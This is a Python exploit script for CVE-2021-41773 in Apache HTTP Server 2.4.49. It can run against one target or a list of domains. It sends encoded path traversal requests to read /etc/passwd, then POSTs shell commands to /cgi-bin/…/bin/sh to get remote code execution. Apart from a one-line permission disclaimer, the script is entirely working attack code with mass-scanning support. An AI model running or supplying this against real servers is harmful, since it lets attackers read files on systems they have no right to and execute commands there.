#!/usr/bin/env python3

# Exploit Title: Path Traversal in Apache HTTP Server 2.4.49 CVE-2021-41773
# Date: 2021-10-11
# Exploit Author: 0xAlmighty
# GitHub: https://github.com/0xalmighty
# Info: Test for LFI and RCE in Apache 2.4.49, you can test a single target or a list. Make sure you specify HTTP or HTTPS for single target.
# Test only if you're authorized, be smart.                 
# Example usage: python3 cve2021-41773.py -target DOMAIN/IP -protocol HTTP/HTTPS -file domain_list.txt

import urllib3
import sys
import re
import requests
import argparse
import warnings
import time
import urllib.parse
from requests import Request, Session
from requests.exceptions import Timeout


# Cool banner
banner = '''\033[1;32m
  ██████╗ ██╗   ██╗ ███████╗        ██████╗   ██████╗  ██████╗   ██╗        ██╗  ██╗  ██╗ ███████╗ ███████╗ ██████╗
 ██╔════╝ ██║   ██║ ██╔════╝        ╚════██╗ ██╔═████╗ ╚════██╗ ███║        ██║  ██║ ███║ ╚════██║ ╚════██║ ╚════██╗
 ██║      ██║   ██║ █████╗   █████╗  █████╔╝ ██║██╔██║  █████╔╝ ╚██║ █████╗ ███████║ ╚██║     ██╔╝     ██╔╝  █████╔╝
 ██║      ╚██╗ ██╔╝ ██╔══╝   ╚════╝ ██╔═══╝  ████╔╝██║ ██╔═══╝   ██║ ╚════╝ ╚════██║  ██║    ██╔╝     ██╔╝   ╚═══██╗
 ╚██████╗  ╚████╔╝  ███████╗        ███████╗ ╚██████╔╝ ███████╗  ██║             ██║  ██║    ██║      ██║   ██████╔╝
  ╚═════╝   ╚═══╝   ╚══════╝        ╚══════╝  ╚═════╝  ╚══════╝  ╚═╝             ╚═╝  ╚═╝    ╚═╝      ╚═╝   ╚═════╝
\t\033[1;37mTwitter @0xalmighty\t\t\t\t\t\t\033[1;37mᴵⁿᵛᶦˢᶦᵇˡᵉ ᵗʰᶦⁿᵍˢ ᵃʳᵉ ᵗʰᵉ ᵒⁿˡʸ ʳᵉᵃˡᶦᵗᶦᵉˢ
'''

# Read the file, do some cleanup and create a new file
def exploitlist(file):
        cleanlist = open("cleanlist.txt", "w")       
        for file in args.file:
                clean = re.sub(r'https?:\/\/()','',file)
                #print(clean.rstrip('\n'))
                cleanlist.write(clean)
        cleanlist.close()
        print(f'\n\033[93m[Info]..........Testing for LFI..........\n')
        f1 = open('cleanlist.txt', 'r').readlines()
        for url in f1:
                strip = url.strip()
                time.sleep(2)
                try:
                        s3 = Session()
                        req = Request('GET', 'http://'+strip+'/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd')
                        prepped = req.prepare()
                        prepped.url = 'http://'+strip+'/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
                        resp = s3.send(prepped, timeout=8, verify=False)
                        if 'root' in resp.text:
                                print(f'\033[0;31m[!][!][!]------VULNERABLE------[!][!][!]\n')
                                print(f'\033[0;31m'+prepped.url+'\n')
                                print(f'\033[0;31m[!][!][!]---------PoC----------[!][!][!]\n')
                                print(f'\033[0;31m'+resp.text)
                        else:
                                print(f'\033[0;32m[*]'+prepped.url+' is not vulnerable :(')
                        s3.close()
                except Timeout:
                        continue
                except requests.exceptions.ConnectionError:
                        resp.status_code = "Connection refused"
                try:
                        s3 = Session()
                        req = Request('GET', 'https://'+strip+'/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd')
                        prepped = req.prepare()
                        prepped.url = 'https://'+strip+'/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
                        resp = s3.send(prepped, timeout=8, verify=False)
                        if 'root' in resp.text:
                                print(f'\033[0;31m[!][!][!]------VULNERABLE------[!][!][!]\n')
                                print(f'\033[0;31m'+prepped.url+'\n')
                                print(f'\033[0;31m[!][!][!]---------PoC----------[!][!][!]\n')
                                print(f'\033[0;31m'+resp.text)
                        else:
                                print(f'\033[0;32m[*]'+prepped.url+' is not vulnerable :(')
                        s3.close()
                except Timeout:
                        continue
                except requests.exceptions.ConnectionError:
                        resp.status_code = "Connection refused"
        cleanlist.close()

# Provide single target
def exploit(ip, protocol):
        print(f'\n\033[93m[Info]..........Testing for LFI..........\n')
        time.sleep(2)
        s = Session()
        host = ip
        req = Request('GET', protocol+'://'+host+'/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd')
        prepped = req.prepare()
        prepped.url = protocol+'://'+host+':80/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
        resp = s.send(prepped, timeout=5)
        if 'root' in resp.text:
                print(f'\033[0;31m[!][!][!]------VULNERABLE------[!][!][!]\n')
                print(f'\033[0;31m'+prepped.url+'\n')
                print(f'\033[0;31m[!][!][!]---------PoC----------[!][!][!]\n')
                print(f'\033[0;31m'+resp.text)
        else:
                print(f'\033[0;32m[*]'+prepped.url+' is not vulnerable :(')
        s.close()

        # Check if vulnerable to RCE
        time.sleep(2)
        print(f'\033[93m[Info]..........Now testing for RCE..........\n')
        time.sleep(2)
        s2 = requests.Session()
        host = ip
        attack = "echo; id"
        req2 = Request('POST', protocol+'://'+host+'/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh', data=attack)
        prepped2 = req2.prepare()
        prepped2.url = protocol+'://'+host+':80/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh'  
        resp2 = s2.send(prepped2, timeout=5)
        if 'uid' in resp2.text:
                print(f'\033[0;31m[!][!][!]------VULNERABLE------[!][!][!]\n')
                print(f'\033[0;31m'+prepped2.url+'\n')
                print(f'\033[0;31m[!][!][!]---------PoC----------[!][!][!]\n')
                print(f'\033[0;31m'+resp2.text)

        else:
                print(f'\033[0;32m[*]'+prepped2.url+' is not vulnerable :(')
        s2.close()

# Instruction
if __name__ == '__main__':
        
        requests.packages.urllib3.disable_warnings()
        
        from argparse import ArgumentParser
        parser = ArgumentParser(description='\033[1;31mNeed help?')
        parser.add_argument('-target', help='Single domain or IP', required=False)
        parser.add_argument('-protocol', help='HTTP or HTTPS', required=False)
        parser.add_argument('-file', help='List of target in txt format', required=False, type=argparse.FileType('r'))

        args = parser.parse_args()

        if args.target:
                ip = exploit(args.target, args.protocol)

        if args.file:
                file = exploitlist(args.file)

        if len(sys.argv) < 2:
                print(f'{banner}\n')
                print(f'\t\033[93mProof of concept for CVE-2021-41773, use it if you have permission only\n')
                print(f'\t\033[1;31mUsage:\033[1;37m python3 {sys.argv[0]} -target domain/IP -protocol HTTP/HTTPS -file domain_list.txt\n')
                print(f'\t\033[1;31mNeed help?\n')
                print(f'\t\033[1;31mTry: \033[1;37mpython3 cve2021-41773.py --help\n')
                sys.exit(0)